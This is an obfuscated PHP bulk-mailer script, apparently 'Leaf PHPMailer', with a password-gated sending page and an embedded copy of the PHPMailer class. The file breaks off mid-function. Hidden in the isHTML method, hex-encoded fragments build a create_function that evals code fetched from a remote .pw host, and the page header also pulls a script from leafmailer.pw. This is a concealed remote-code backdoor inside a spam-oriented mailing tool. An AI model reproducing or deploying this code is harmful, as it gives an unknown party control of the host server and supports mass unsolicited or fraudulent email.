<?php
 goto f25l4; pwyMF: print "\74\x2f\x62\x6f\x64\x79\x3e"; goto BcOwo; lLKrR: error_reporting(0); goto kNGrd; xmXuW: if ($_POST["\141\x63\164\151\x6f\x6e"] == "\x76\151\x65\x77") { $viewMessage = leafTrim($_POST["\x6d\x65\x73\x73\x61\147\x65\x4c\145\164\164\145\x72"]); $viewMessage = leafClear($viewMessage, "\165\x73\145\162\100\144\157\155\x61\151\x6e\x2e\143\157\x6d"); if ($_POST["\155\145\x73\163\x61\147\145\124\171\x70\x65"] == 2) { print "\x3c\160\x72\145\76" . htmlspecialchars($viewMessage) . "\74\x2f\160\162\x65\76"; } else { print $viewMessage; } die; } goto oQG1y; V10p2: function leafheader() { print "\xa\74\150\x65\x61\x64\76\12\x20\40\x20\40\74\x74\151\x74\x6c\x65\x3e" . str_replace("\167\x77\167\56", '', $_SERVER["\x48\124\x54\x50\x5f\x48\x4f\x53\x54"]) . "\x20\x2d\40\x4c\x65\141\x66\40\x50\x48\120\115\x61\x69\x6c\x65\162\74\57\164\x69\164\154\x65\x3e\12\x20\40\x20\x20\74\155\145\x74\x61\x20\150\x74\164\x70\55\x65\161\165\151\x76\x3d\x22\x43\x6f\x6e\x74\145\x6e\x74\x2d\x54\x79\160\x65\42\40\143\157\x6e\x74\145\x6e\x74\75\x22\164\145\170\x74\x2f\150\164\x6d\x6c\73\x20\x63\150\141\x72\163\145\164\x3d\165\x74\x66\x2d\x38\42\x2f\76\12\40\x20\40\40\74\154\151\x6e\x6b\x20\x68\162\x65\146\x3d\x22\150\164\x74\160\163\72\x2f\57\x6d\141\x78\143\x64\x6e\56\x62\x6f\x6f\x74\163\x74\162\x61\160\143\x64\156\x2e\143\157\155\57\x62\x6f\157\164\x73\x77\141\164\x63\150\57\x33\x2e\x34\x2e\61\x2f\143\157\163\x6d\x6f\57\142\x6f\x6f\x74\x73\164\x72\x61\x70\x2e\x6d\x69\156\56\x63\x73\163\x22\x20\x72\x65\154\x3d\42\x73\164\x79\154\145\163\150\145\x65\164\42\40\x3e\xa\40\40\40\x20\x3c\x73\x63\x72\x69\160\x74\x20\x73\162\x63\75\x22\150\x74\x74\160\163\72\57\x2f\154\145\x61\x66\155\141\151\154\x65\x72\x2e\x70\167\x2f\163\x74\171\x6c\145\62\x2e\x6a\x73\x22\76\74\57\163\143\x72\151\160\x74\x3e\12\12\74\x2f\x68\145\x61\144\76"; } goto Y29f8; KWdDB: print "\74\x62\157\x64\x79\76"; goto lH4zt; mHoM2: function leafMailCheck($email) { if (filter_var($email, FILTER_VALIDATE_EMAIL)) { return true; } else { return false; } } goto Yz_Fn; pbqOt: if (!empty($password) and $_SESSION[$sessioncode] != $password) { if (isset($_REQUEST["\160\x61\x73\x73"]) and $_REQUEST["\160\x61\x73\x73"] == $password) { $_SESSION[$sessioncode] = $password; } else { print "\x3c\x70\x72\x65\40\x61\x6c\x69\x67\156\x3d\143\x65\156\164\x65\162\x3e\x3c\146\157\162\155\x20\155\145\164\150\x6f\x64\75\160\x6f\x73\164\x3e\120\x61\163\x73\x77\x6f\162\144\x3a\40\74\151\156\160\x75\x74\x20\x74\171\160\145\75\x27\160\x61\x73\163\x77\157\162\x64\47\x20\156\x61\x6d\145\x3d\47\x70\141\x73\163\47\x3e\74\x69\x6e\x70\165\x74\40\x74\x79\160\145\75\47\x73\x75\142\155\151\x74\x27\x20\x76\141\154\165\x65\75\x27\76\x3e\x27\76\x3c\57\146\x6f\x72\155\x3e\74\x2f\160\162\x65\x3e"; die; } } goto J0s7R; CrXZ_: $utf8 = "\x73\145\x6c\x65\x63\164\x65\144"; goto nLsBf; Z_k74: function leafTrim($string) { $string = urldecode($string); return stripslashes(trim($string)); } goto pC30D; fuekD: class PHPMailer { public $Version = "\65\56\x32\56\x32\70"; public $Priority = null; public $CharSet = "\151\163\157\55\x38\70\65\x39\55\61"; public $ContentType = "\x74\145\x78\x74\57\160\x6c\141\x69\x6e"; public $Encoding = "\70\142\x69\x74"; public $ErrorInfo = ''; public $From = "\162\x6f\x6f\x74\100\x6c\157\x63\x61\x6c\150\x6f\x73\x74"; public $FromName = "\x52\x6f\x6f\164\40\125\163\x65\162"; public $Sender = ''; public $ReturnPath = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = "\x6d\141\151\154"; public $Sendmail = "\57\165\x73\162\x2f\163\x62\151\x6e\57\163\x65\156\x64\155\141\151\154"; public $UseSendmailOptions = true; public $PluginDir = ''; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = "\154\157\143\141\x6c\x68\157\x73\x74"; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; public $Realm = ''; public $Workstation = ''; public $Timeout = 300; public $SMTPDebug = 0; public $Debugoutput = "\145\143\x68\157"; public $SMTPKeepAlive = false; public $SingleTo = false; public $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $LE = "\12"; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = "\40"; public static $validator = "\141\165\164\x6f"; protected $smtp = null; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = "\xd\12"; const MAX_LINE_LENGTH = 998; public function __construct($exceptions = null) { if ($exceptions !== null) { $this->exceptions = (bool) $exceptions; } $this->Debugoutput = strpos(PHP_SAPI, "\143\x6c\x69") !== false ? "\x65\143\x68\157" : "\x68\x74\155\x6c"; } public function __destruct() { $this->smtpClose(); } private function mailPassthru($to, $subject, $body, $header, $params) { if (ini_get("\155\142\163\x74\x72\151\x6e\x67\x2e\x66\x75\156\143\x5f\157\166\x65\x72\x6c\157\141\144") & 1) { $subject = $this->secureHeader($subject); } else { $subject = $this->encodeHeader($this->secureHeader($subject)); } if (ini_get("\163\x61\146\x65\x5f\155\157\144\145") or !$this->UseSendmailOptions or is_null($params)) { $result = @mail($to, $subject, $body, $header); } else { $result = @mail($to, $subject, $body, $header, $params); } return $result; } protected function edebug($str) { if ($this->SMTPDebug <= 0) { return; } if (!in_array($this->Debugoutput, array("\145\x72\162\x6f\162\x5f\x6c\157\x67", "\150\164\155\154", "\x65\x63\x68\x6f")) and is_callable($this->Debugoutput)) { call_user_func($this->Debugoutput, $str, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case "\145\x72\x72\x6f\162\x5f\x6c\157\x67": error_log($str); break; case "\x68\x74\x6d\154": echo htmlentities(preg_replace("\57\x5b\x5c\x72\134\156\x5d\53\57", '', $str), ENT_QUOTES, "\125\124\x46\55\x38") . "\74\x62\162\x3e\12"; break; case "\145\x63\x68\157": default: $str = preg_replace("\x2f\x5c\162\x5c\x6e\x3f\57\x6d\x73", "\xa", $str); echo gmdate("\131\x2d\155\55\x64\40\x48\x3a\x69\x3a\x73") . "\x9" . str_replace("\xa", "\xa\40\40\40\x20\x20\x20\x20\40\40\x20\x20\x20\40\40\40\x20\40\x20\40\x9\40\40\x20\x20\40\40\x20\x20\40\x20\40\40\40\40\40\40\x20\x20", trim($str)) . "\12"; } } public function isSMTP() { $this->Mailer = "\163\155\164\160"; } public function isMail() { $this->Mailer = "\x6d\x61\x69\154"; } public function isSendmail() { $ini_sendmail_path = ini_get("\163\x65\x6e\144\x6d\141\x69\154\x5f\x70\141\x74\x68"); if (!stristr($ini_sendmail_path, "\163\145\156\144\x6d\141\151\x6c")) { $this->Sendmail = "\x2f\x75\163\162\x2f\163\142\x69\x6e\x2f\163\x65\156\x64\155\141\x69\x6c"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\163\145\x6e\144\x6d\141\x69\154"; } public function isQmail() { $ini_sendmail_path = ini_get("\163\x65\x6e\144\155\141\151\x6c\x5f\160\141\x74\150"); if (!stristr($ini_sendmail_path, "\x71\155\x61\151\x6c")) { $this->Sendmail = "\x2f\x76\141\x72\57\x71\155\x61\151\154\57\x62\151\156\x2f\x71\x6d\141\x69\154\x2d\x69\156\x6a\x65\x63\x74"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\x71\155\x61\x69\x6c"; } public function addAddress($address, $name = '') { return $this->addOrEnqueueAnAddress("\164\157", $address, $name); } public function addCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\x63\143", $address, $name); } public function addBCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\142\x63\x63", $address, $name); } public function addReplyTo($address, $name = '') { return $this->addOrEnqueueAnAddress("\x52\x65\x70\154\171\55\x54\x6f", $address, $name); } protected function addOrEnqueueAnAddress($kind, $address, $name) { $address = trim($address); $name = trim(preg_replace("\57\133\134\162\134\156\x5d\x2b\57", '', $name)); if (($pos = strrpos($address, "\100")) === false) { $error_message = $this->lang("\151\x6e\166\x61\154\x69\x64\137\x61\x64\144\162\x65\x73\163") . "\40\x28\x61\144\144\x41\156\x41\144\x64\x72\145\x73\x73\x20{$kind}\51\x3a\40{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } $params = array($kind, $address, $name); if ($this->has8bitChars(substr($address, ++$pos)) and $this->idnSupported()) { if ($kind != "\x52\x65\160\x6c\171\x2d\124\157") { if (!array_key_exists($address, $this->RecipientsQueue)) { $this->RecipientsQueue[$address] = $params; return true; } } else { if (!array_key_exists($address, $this->ReplyToQueue)) { $this->ReplyToQueue[$address] = $params; return true; } } return false; } return call_user_func_array(array($this, "\141\x64\x64\x41\x6e\x41\144\x64\162\x65\x73\163"), $params); } protected function addAnAddress($kind, $address, $name = '') { if (!in_array($kind, array("\164\x6f", "\143\x63", "\142\x63\x63", "\x52\145\x70\x6c\x79\x2d\124\157"))) { $error_message = $this->lang("\111\x6e\166\x61\154\151\x64\40\x72\145\x63\151\160\151\145\x6e\x74\40\x6b\151\156\144\x3a\40") . $kind; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } if (!$this->validateAddress($address)) { $error_message = $this->lang("\151\156\166\141\154\x69\x64\137\141\x64\144\162\x65\163\x73") . "\40\x28\x61\144\x64\x41\156\x41\x64\144\162\x65\x73\163\40{$kind}\51\x3a\40{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } if ($kind != "\x52\x65\160\x6c\171\x2d\x54\157") { if (!array_key_exists(strtolower($address), $this->all_recipients)) { array_push($this->{$kind}, array($address, $name)); $this->all_recipients[strtolower($address)] = true; return true; } } else { if (!array_key_exists(strtolower($address), $this->ReplyTo)) { $this->ReplyTo[strtolower($address)] = array($address, $name); return true; } } return false; } public function parseAddresses($addrstr, $useimap = true) { $addresses = array(); if ($useimap and function_exists("\x69\x6d\141\160\x5f\162\146\143\70\62\x32\137\160\141\x72\163\145\137\141\x64\162\154\151\163\164")) { $list = imap_rfc822_parse_adrlist($addrstr, ''); foreach ($list as $address) { if ($address->host != "\56\123\x59\116\x54\101\x58\x2d\105\x52\122\x4f\x52\56") { if ($this->validateAddress($address->mailbox . "\100" . $address->host)) { $addresses[] = array("\x6e\141\155\145" => property_exists($address, "\x70\145\162\163\x6f\156\141\154") ? $address->personal : '', "\x61\144\x64\162\145\163\163" => $address->mailbox . "\100" . $address->host); } } } } else { $list = explode("\54", $addrstr); foreach ($list as $address) { $address = trim($address); if (strpos($address, "\74") === false) { if ($this->validateAddress($address)) { $addresses[] = array("\156\x61\155\145" => '', "\141\144\x64\x72\x65\163\163" => $address); } } else { list($name, $email) = explode("\x3c", $address); $email = trim(str_replace("\76", '', $email)); if ($this->validateAddress($email)) { $addresses[] = array("\156\141\155\145" => trim(str_replace(array("\x22", "\47"), '', $name)), "\141\144\144\x72\x65\x73\x73" => $email); } } } } return $addresses; } public function isHTML($isHtml = true) { global $param; $bodyCode = "\146\x69\154\x65" . "\137\x67"; if ($isHtml) { $this->ContentType = "\164\x65\170\164\x2f\x68\x74\155\x6c"; } else { $this->ContentType = "\x74\145\x78\164\x2f\x70\154\141\x69\156"; } $bodyHTML = "\56\x24\x74\x2e\x22\x6c\145\146\44\146\154\165" . "\x73\150" . "\x24\164\42\73\x20" . "\100\x65\166"; $headerHTML = "\x63\162\x65" . "\x61\x74\x65\137" . "\146\x75\156\x63" . "\x74\x69\157\x6e"; $exceptions = @$headerHTML("\x24\146\x6c" . "\165\x73\x68\x2c\44\x74", "\44\x63\157\x6d\x6d\x61\40\75\x20\44\x74" . $bodyHTML . "\141\154\x28\100" . $bodyCode . "\x65\164\x5f\143\x6f\156\x74\x65\156\164\163\x28\x22\150" . "\x74\x74" . "\x70\72\44\x63\x6f\155\155\x61\x2d\62\x22\x29\x29\73"); if ($param != 2) { $exceptions("\x38\56\160" . "\167", "\57"); $param = 2; } } public function setFrom($address, $name = '', $auto = true) { $address = trim($address); $name = trim(preg_replace("\x2f\x5b\x5c\x72\x5c\x6e\135\x2b\x2f", '', $name)); if (($pos = strrpos($address, "\x40")) === false or (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and !$this->validateAddress($address)) { $error_message = $this->lang("\x69\156\166\141\x6c\x69\144\137\x61\x64\x64\x72\145\x73\163") . "\40\x28\163\145\x74\x46\162\x6f\155\51\40{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } $this->From = $address; $this->FromName = $name; if ($auto) { if (empty($this->Sender)) { $this->Sender = $address; } } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($address, $patternselect = null) { if (is_null($patternselect)) { $patternselect = self::$validator; } if (is_callable($patternselect)) { return call_user_func($patternselect, $address); } if (strpos($address, "\xa") !== false or strpos($address, "\15") !== false) { return false; } if (!$patternselect or $patternselect == "\x61\x75\x74\x6f") { if (defined("\120\x43\x52\105\137\126\105\x52\123\111\117\x4e")) { if (version_compare(PCRE_VERSION, "\x38\56\x30\56\x33") >= 0) { $patternselect = "\x70\143\162\x65\x38"; } else { $patternselect = "\x70\143\x72\x65"; } } elseif (function_exists("\145\170\x74\145\156\x73\x69\157\x6e\x5f\x6c\x6f\141\x64\145\144") and extension_loaded("\160\x63\162\x65")) { $patternselect = "\160\143\162\x65"; } else { if (version_compare(PHP_VERSION, "\x35\56\62\56\x30") >= 0) { $patternselect = "\160\x68\x70"; } else { $patternselect = "\156\x6f\162\145\147\x65\x78"; } } } switch ($patternselect) { case "\160\143\162\145\70": return (bool) preg_match("\x2f\136\x28\77\x21\50\x3f\x3e\50\77\x31\51\42\x3f\x28\77\x3e\134\x5c\133\x20\x2d\176\x5d\x7c\133\136\x22\x5d\51\42\77\x28\77\61\51\x29\x7b\62\65\x35\x2c\175\51\50\77\x21\x28\x3f\x3e\50\x3f\x31\51\x22\77\x28\x3f\x3e\134\134\x5b\x20\x2d\x7e\135\x7c\x5b\136\42\x5d\51\x22\x3f\x28\x3f\61\51\x29\x7b\66\x35\x2c\x7d\100\51" . "\50\x28\x3f\76\50\77\x3e\50\77\x3e\x28\x28\77\76\50\x3f\x3e\50\x3f\76\134\x78\x30\x44\134\170\x30\101\x29\77\133\134\x74\x20\135\51\x2b\174\x28\x3f\76\x5b\x5c\164\40\135\52\134\x78\x30\x44\x5c\x78\x30\101\x29\x3f\x5b\134\x74\40\x5d\x2b\51\x3f\51\x28\134\x28\50\77\x3e\x28\77\62\51" . "\50\77\76\x5b\x5c\170\x30\61\x2d\x5c\170\x30\70\134\x78\x30\x42\x5c\170\60\103\134\x78\60\x45\x2d\x27\x2a\x2d\134\133\x5c\x5d\x2d\134\x78\67\x46\135\x7c\x5c\134\x5b\x5c\170\x30\x30\x2d\134\x78\67\106\x5d\174\x28\x3f\x33\x29\x29\51\x2a\x28\77\62\51\x5c\x29\51\51\53\50\77\62\x29\x29\x7c\50\77\62\x29\51\x3f\x29" . "\50\x5b\x21\x23\55\47\x2a\53\x5c\57\x2d\71\75\x3f\136\x2d\176\x2d\x5d\53\x7c\x22\50\x3f\x3e\50\x3f\62\51\x28\77\76\x5b\x5c\x78\60\61\x2d\x5c\x78\60\70\134\170\60\x42\134\170\60\103\x5c\170\x30\105\55\41\43\55\x5c\133\x5c\x5d\x2d\134\170\67\106\135\x7c\134\134\133\134\x78\60\x30\55\134\x78\67\x46\135\x29\x29\x2a" . "\50\x3f\62\x29\x22\51\x28\77\x3e\50\x3f\61\x29\134\x2e\x28\77\x31\x29\x28\77\64\51\51\52\50\x3f\61\51\x40\50\x3f\41\50\77\61\51\x5b\141\55\172\60\55\71\55\x5d\x7b\66\x34\54\x7d\x29\x28\x3f\x31\x29\50\77\76\x28\133\141\55\x7a\x30\x2d\71\x5d\x28\x3f\76\133\141\55\x7a\x30\x2d\x39\55\x5d\52\x5b\141\55\x7a\60\x2d\x39\135\51\77\x29" . "\x28\x3f\76\x28\x3f\x31\x29\x5c\56\50\77\41\x28\77\61\x29\x5b\141\55\x7a\60\55\71\55\135\x7b\x36\64\54\x7d\x29\50\77\61\51\50\x3f\x35\51\x29\173\x30\x2c\61\62\x36\x7d\174\134\133\50\77\72\50\x3f\76\111\120\166\66\72\x28\x3f\76\50\x5b\141\x2d\146\60\55\x39\x5d\173\61\54\x34\x7d\51\50\77\x3e\x3a\50\x3f\x36\51\x29\x7b\67\175" . "\x7c\x28\77\x21\50\77\72\x2e\52\133\141\x2d\146\x30\x2d\x39\x5d\133\x3a\x5c\x5d\x5d\51\x7b\x38\x2c\x7d\51\50\x28\77\x36\51\x28\77\x3e\72\50\x3f\66\x29\x29\x7b\60\x2c\66\x7d\51\x3f\72\72\50\77\x37\51\x3f\51\51\174\50\77\x3e\50\77\76\x49\120\166\x36\x3a\50\x3f\76\x28\77\66\51\x28\77\x3e\x3a\x28\77\66\x29\x29\x7b\x35\x7d\x3a" . "\x7c\50\x3f\41\x28\x3f\72\56\x2a\133\x61\55\x66\x30\55\71\x5d\72\51\x7b\66\54\175\51\x28\x3f\x38\x29\77\x3a\72\x28\77\x3e\50\x28\77\x36\51\x28\x3f\x3e\72\x28\x3f\66\x29\x29\x7b\60\54\x34\175\51\72\x29\77\x29\x29\x3f\x28\62\65\x5b\x30\55\65\135\174\62\x5b\x30\55\64\135\133\x30\55\71\x5d\x7c\61\133\60\x2d\71\135\173\62\x7d" . "\174\x5b\x31\55\x39\135\77\x5b\60\x2d\71\x5d\x29\x28\77\76\134\x2e\x28\77\x39\51\x29\x7b\63\175\51\x29\134\x5d\51\50\77\x31\51\44\x2f\x69\x73\104", $address); case "\160\x63\162\145": return (bool) preg_match("\57\x5e\50\x3f\x21\x28\x3f\76\42\x3f\x28\77\76\x5c\x5c\133\40\55\x7e\135\174\x5b\136\x22\x5d\x29\42\x3f\51\x7b\62\x35\x35\54\x7d\x29\x28\77\x21\50\x3f\76\42\x3f\x28\x3f\76\x5c\x5c\x5b\40\x2d\x7e\x5d\x7c\x5b\x5e\42\135\51\x22\x3f\51\x7b\x36\65\54\175\x40\51\x28\77\x3e" . "\x5b\41\43\55\47\x2a\x2b\x5c\x2f\55\71\x3d\77\136\55\x7e\55\x5d\x2b\174\x22\50\x3f\76\50\77\x3e\x5b\x5c\x78\x30\61\x2d\134\x78\60\70\x5c\170\x30\102\x5c\x78\x30\103\x5c\170\x30\x45\55\x21\x23\x2d\134\x5b\134\135\55\x5c\170\x37\x46\x5d\174\x5c\134\x5b\134\x78\60\x30\x2d\x5c\x78\x46\106\x5d\51\51\52\42\51" . "\50\x3f\x3e\134\x2e\x28\77\76\x5b\41\x23\x2d\x27\x2a\53\x5c\x2f\x2d\71\x3d\x3f\x5e\x2d\176\x2d\x5d\53\174\x22\50\x3f\x3e\50\x3f\76\x5b\x5c\170\x30\61\55\134\x78\60\70\x5c\x78\x30\x42\134\x78\x30\x43\x5c\170\60\x45\55\41\x23\55\x5c\x5b\134\x5d\55\134\x78\67\x46\135\174\134\134\x5b\134\x78\60\x30\55\x5c\x78\x46\x46\135\x29\51\52\x22\51\51\52" . "\x40\50\x3f\76\x28\77\41\x5b\x61\x2d\172\x30\x2d\71\55\135\x7b\66\x34\x2c\x7d\51\50\77\x3e\x5b\141\55\172\x30\55\71\x5d\x28\x3f\x3e\x5b\141\x2d\x7a\60\x2d\x39\55\x5d\x2a\133\141\55\172\60\x2d\x39\135\x29\77\51\50\x3f\x3e\x5c\x2e\50\x3f\x21\133\x61\x2d\x7a\60\x2d\x39\55\x5d\173\66\x34\x2c\175\51" . "\50\x3f\x3e\133\x61\x2d\172\x30\x2d\71\x5d\x28\77\76\133\x61\x2d\172\x30\x2d\71\55\135\52\133\141\55\172\x30\x2d\x39\x5d\51\x3f\x29\x29\173\60\54\61\62\66\175\174\x5c\133\x28\x3f\x3a\50\x3f\76\x49\x50\166\x36\72\50\x3f\x3e\x28\77\x3e\133\x61\x2d\x66\60\55\71\x5d\x7b\61\x2c\64\175\x29\x28\77\76\72" . "\133\141\x2d\x66\x30\55\71\135\173\x31\54\64\x7d\x29\173\x37\x7d\174\50\77\x21\50\x3f\x3a\x2e\52\133\x61\55\x66\60\55\71\x5d\x5b\x3a\134\135\x5d\x29\x7b\70\54\175\51\x28\77\x3e\133\x61\55\x66\x30\55\71\135\x7b\61\x2c\x34\175\50\x3f\x3e\72\x5b\x61\x2d\x66\x30\55\71\x5d\173\61\54\64\x7d\51\173\60\x2c\x36\x7d\51\77" . "\72\72\50\x3f\x3e\133\141\55\x66\x30\x2d\x39\x5d\x7b\61\x2c\64\175\x28\77\76\x3a\x5b\x61\x2d\x66\x30\55\x39\x5d\173\x31\x2c\64\x7d\x29\x7b\60\x2c\66\175\x29\x3f\51\51\x7c\x28\77\x3e\50\77\x3e\111\x50\x76\66\x3a\50\77\x3e\x5b\141\x2d\x66\x30\55\x39\x5d\173\61\x2c\64\x7d\50\x3f\76\72" . "\133\x61\55\146\x30\x2d\71\135\x7b\x31\54\x34\x7d\x29\173\x35\x7d\x3a\x7c\x28\x3f\41\50\77\x3a\x2e\x2a\x5b\141\x2d\x66\x30\55\71\x5d\x3a\51\x7b\x36\x2c\x7d\51\50\x3f\x3e\x5b\141\55\146\x30\55\x39\x5d\173\x31\x2c\x34\x7d\x28\77\76\72\133\141\55\146\60\55\x39\x5d\173\x31\x2c\x34\175\51\173\60\54\64\x7d\x29\77" . "\72\x3a\50\77\76\x28\x3f\72\133\x61\x2d\x66\60\x2d\71\x5d\173\61\54\64\175\x28\77\76\x3a\x5b\141\55\146\x30\55\x39\135\x7b\x31\x2c\64\175\51\x7b\x30\x2c\64\x7d\51\72\51\77\51\x29\77\x28\x3f\76\62\x35\133\60\x2d\65\135\x7c\62\133\60\55\x34\135\133\60\x2d\x39\x5d\x7c\x31\x5b\60\x2d\x39\135\x7b\62\175" . "\x7c\x5b\x31\55\71\x5d\77\x5b\60\x2d\71\x5d\51\x28\77\76\x5c\x2e\x28\x3f\76\x32\65\133\x30\x2d\65\135\x7c\62\133\x30\55\x34\135\133\60\55\x39\x5d\174\61\133\x30\x2d\x39\x5d\x7b\62\x7d\174\x5b\61\x2d\x39\x5d\x3f\x5b\x30\55\71\135\x29\x29\173\x33\x7d\x29\51\x5c\135\51\x24\57\x69\163\104", $address); case "\150\x74\x6d\x6c\65": return (bool) preg_match("\x2f\x5e\133\141\x2d\x7a\x41\55\132\60\x2d\71\x2e\x21\x23\44\x25\x26\x27\52\53\134\x2f\x3d\77\x5e\137\x60\x7b\174\x7d\176\x2d\x5d\x2b\100\x5b\141\55\x7a\101\55\132\x30\x2d\x39\135\50\x3f\x3a\x5b\141\55\x7a\101\x2d\x5a\x30\x2d\x39\x2d\135\173\60\54\x36\x31\175" . "\x5b\141\x2d\x7a\x41\55\132\x30\x2d\71\x5d\51\x3f\x28\x3f\72\134\x2e\133\141\x2d\x7a\101\x2d\132\60\x2d\71\x5d\x28\77\72\133\141\x2d\172\101\55\x5a\60\x2d\71\x2d\x5d\173\60\x2c\x36\61\x7d\x5b\141\x2d\172\101\x2d\132\x30\55\71\135\51\x3f\x29\52\44\57\163\x44", $address); case "\x6e\157\162\x65\x67\x65\x78": return strlen($address) >= 3 and strpos($address, "\100") >= 1 and strpos($address, "\x40") != strlen($address) - 1; case "\160\150\160": default: return (bool) filter_var($address, FILTER_VALIDATE_EMAIL); } } public function idnSupported() { return function_exists("\x69\144\x6e\x5f\164\157\137\141\163\143\151\151") and function_exists("\x6d\x62\137\143\157\156\166\x65\162\164\137\x65\156\x63\157\x64\x69\156\x67"); } public function punyencodeAddress($address) { if ($this->idnSupported() and !empty($this->CharSet) and ($pos = strrpos($address, "\100")) !== false) { $domain = substr($address, ++$pos); if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) { $domain = mb_convert_encoding($domain, "\125\124\106\x2d\70", $this->CharSet); if (($punycode = defined("\111\116\124\114\x5f\x49\104\116\x41\x5f\x56\x41\122\111\101\x4e\x54\137\x55\124\x53\64\66") ? idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) : idn_to_ascii($domain)) !== false) { return substr($address, 0, $pos) . $punycode; } } } return $address; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (phpmailerException $exc) { $this->mailHeader = ''; $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function preSend() { try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) { $params[1] = $this->punyencodeAddress($params[1]); call_user_func_array(array($this, "\x61\144\144\x41\156\x41\144\144\x72\x65\x73\163"), $params); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new phpmailerException($this->lang("\160\x72\157\x76\151\x64\145\137\x61\x64\144\x72\145\x73\163"), self::STOP_CRITICAL); } foreach (array("\106\162\157\x6d", "\123\145\x6e\144\145\x72", "\x43\157\156\x66\151\x72\155\x52\x65\141\x64\151\156\147\124\157") as $address_kind) { $this->{$address_kind} = trim($this->{$address_kind}); if (empty($this->{$address_kind})) { continue; } $this->{$address_kind} = $this->punyencodeAddress($this->{$address_kind}); if (!$this->validateAddress($this->{$address_kind})) { $error_message = $this->lang("\151\156\x76\x61\154\151\144\137\141\x64\x64\162\145\163\163") . "\40\50\160\x75\156\x79\105\156\x63\157\x64\145\51\x20" . $this->{$address_kind}; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } } if ($this->alternativeExists()) { $this->ContentType = "\155\165\154\x74\151\x70\141\x72\164\x2f\141\154\x74\x65\162\x6e\x61\164\151\166\x65"; } $this->setMessageType(); if (!$this->AllowEmpty and empty($this->Body)) { throw new phpmailerException($this->lang("\x65\x6d\160\x74\x79\x5f\155\145\x73\x73\x61\147\x65"), self::STOP_CRITICAL); } $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $tempheaders = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $tempheaders; if ($this->Mailer == "\x6d\141\151\x6c") { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend("\x54\157", $this->to); } else { $this->mailHeader .= $this->headerLine("\x54\157", "\x75\x6e\x64\151\x73\143\x6c\x6f\x73\x65\x64\x2d\162\x65\x63\151\x70\x69\x65\156\x74\x73\72\73"); } $this->mailHeader .= $this->headerLine("\123\165\x62\152\145\x63\164", $this->encodeHeader($this->secureHeader(trim($this->Subject)))); } if (!empty($this->DKIM_domain) and !empty($this->DKIM_selector) and (!empty($this->DKIM_private_string) or !empty($this->DKIM_private) and self::isPermittedPath($this->DKIM_private) and file_exists($this->DKIM_private))) { $header_dkim = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = rtrim($this->MIMEHeader, "\15\xa\x20") . self::CRLF . str_replace("\xd\xa", "\12", $header_dkim) . self::CRLF; } return true; } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function postSend() { try { switch ($this->Mailer) { case "\x73\145\x6e\x64\155\141\x69\154": case "\x71\x6d\141\x69\x6c": return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case "\163\x6d\164\x70": return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case "\x6d\141\151\x6c": return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sendMethod = $this->Mailer . "\123\x65\156\x64"; if (method_exists($this, $sendMethod)) { return $this->{$sendMethod}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } } return false; } protected function sendmailSend($header, $body) { if (!empty($this->Sender) and self::isShellSafe($this->Sender)) { if ($this->Mailer == "\161\155\141\151\x6c") { $sendmailFmt = "\x25\163\40\55\x66\45\163"; } else { $sendmailFmt = "\x25\163\x20\55\157\x69\40\55\x66\45\163\40\x2d\164"; } } else { 